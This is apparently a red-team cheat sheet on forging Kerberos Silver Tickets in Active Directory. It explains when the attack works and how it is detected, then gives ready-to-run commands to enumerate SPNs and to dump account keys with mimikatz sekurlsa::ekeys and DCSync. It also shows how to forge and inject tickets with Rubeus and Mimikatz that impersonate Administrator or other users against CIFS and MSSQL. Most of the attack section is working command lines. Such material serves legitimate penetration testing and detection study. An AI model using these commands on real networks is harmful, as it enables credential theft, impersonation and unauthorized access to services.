## Information

> Silver Ticket = you control the service, not the KDC.

A Silver Ticket is a forged TGS for a specific SPN, signed with the key (hash) of the account that owns that SPN, usually a computer account (`HOST$`) or a service account. It lets you authenticate directly to the target service **without** interacting with the KDC, which makes it quieter and often stealthier. Its scope is limited: it is not a domain-wide dominance primitive, but a way to access one specific service such as CIFS, MSSQL, or HTTP. The ticket must match a real SPN. Without a valid SPN, there is no valid Silver Ticket.

- [ ] When Does It Work?

| Action / service | Works with a Silver Ticket? | Why |
| --- | ---: | --- |
| `dir \\DC01\C$` (SMB / CIFS) | Yes | SMB accepts a valid TGS and performs local validation with the service key |
| Local LDAP access | Yes | LDAP can validate with the target service key |
| MSSQL (`MSSQLSvc`) | Yes | The service validates the ticket with its own key |
| `Enter-PSSession` (WinRM) | No | Additional validation often breaks the forged flow |
| `winrs.exe` (WinRM) | No | Same WinRM limitations as PowerShell Remoting |

- [ ] Scope and Limitations

- If the machine/service password changes, the forged ticket becomes invalid.
- It does not necessarily generate events on the DC because the KDC is never asked to issue the ticket.
- The target service and destination logs can still expose anomalous logons.

- [ ] OPSEC

Silver Tickets may fail if the service validates the PAC with the KDC because the attacker does not hold the `krbtgt` key. Even where PAC validation is disabled or lax, they are still detectable because the service may show a 4624 logon **without** a preceding 4769 TGS event on the DC. Ticket anomalies such as malformed fields, incoherent values, or unusual domain formatting can also expose the forgery.

## Requirements

1. Enumerate SPNs

```powershell
# ldapsearch
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'Passw0rd!' -b "DC=domain,DC=local" "(sAMAccountName=USER)" servicePrincipalName
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'Passw0rd!' -b "DC=domain,DC=local" "(sAMAccountName=HOST_NAME$)" servicePrincipalName

# PowerView
Get-DomainUser USER_NAME -Properties servicePrincipalName | Select SamAccountName,servicePrincipalName
Get-DomainComputer HOST_NAME -Properties servicePrincipalName | Select Name,servicePrincipalName

# AD module
Get-ADUser -Identity USER_NAME -Properties servicePrincipalName | Select SamAccountName,servicePrincipalName
Get-ADComputer -Identity HOST_NAME -Properties servicePrincipalName | Select Name,servicePrincipalName
```

2. Obtain the key material of the account that owns the SPN (host or user). AES is preferred.

```powershell
# AES
.\mimikatz "privilege::debug" "sekurlsa::ekeys" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:DOMAIN\HOST$" "exit"
```

3. Pick the user to impersonate (`/user`)

4. Get the domain name and SID (`/domain` and `/sid`)

```powershell
whoami /priv
$domain = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Translate([System.Security.Principal.SecurityIdentifier]).AccountDomainSid; $domain
```

5. If you impersonate a non-Administrator user, set `/id`

Rubeus assigns RID `500` by default, so the ticket remains functional for an `Administrator`-style case.

```powershell
cmd.exe /c "wmic useraccount where name='ada' get name,sid"
```

## Silver Ticket Creation

- [ ] CIFS (`host$`)

```powershell
# Rubeus
.\Rubeus.exe silver /service:cifs/dc01 /aes256:AES_DC01 /user:Administrator /domain:DOMAIN.COM /sid:SID_DOMAIN /nowrap /ptt

# Mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.local /sid:SID_DOMAIN /target:dc01.domain.local /service:CIFS /aes256:AES_DC01 /user:Administrator /ptt"'
```

- `/service`: target service and host
- `/aes256`: key material of the target computer/service account
- `/user`: user to impersonate
- `/domain` and `/sid`: domain identity data

> By default, Rubeus uses RID 500 and common privileged groups. You can override `/id` and `/groups` if you want the PAC to more accurately match a specific target user.

- [ ] MSSQL (`user`)

A Silver Ticket can also follow Kerberoasting. If you recover the cleartext password of a service account such as `mssql_svc`, that key can be used to forge a ticket that impersonates a more privileged user such as `ada` against the SQL service.

> In this case it makes sense to set `/id` and `/groups` to reflect the impersonated user's actual or simulated role set.

```powershell
# 1. Get the NTLM hash from the service account password
.\Rubeus.exe hash /user:mssql_svc /domain:DOMAIN.LOCAL /password:Passw0rd!

# 2. Forge the Silver Ticket using that hash
.\Rubeus.exe silver /service:MSSQLSvc/DB01.domain.local:1433 /rc4:HASH_mssql_svc /user:ada /id:1108 /groups:513,1106,1107,4602 /domain:DOMAIN.LOCAL /sid:SID_DOMAIN /nowrap /ptt

# 3. Use it
.\SQLRecon.exe /a:wintoken /h:DB01-1.domain.local /m:info
```

- `/id` -> RID of `ada`
- `/groups` -> Example custom groups often seen in real environments
  - 513: Domain Users
  - 1106: Workstation Administrators
  - 1107: Server Administrators
  - 4602: SQL Server Administrators (custom)
- `/a` = authentication method
- `/h` = target host
- `/m` = module to execute in MSSQL

```text
you have the key for mssql_svc
↓
you can sign valid tickets for that service
↓
you create a ticket claiming “I am ada”
↓
MSSQL accepts it because the ticket is correctly signed by mssql_svc
```
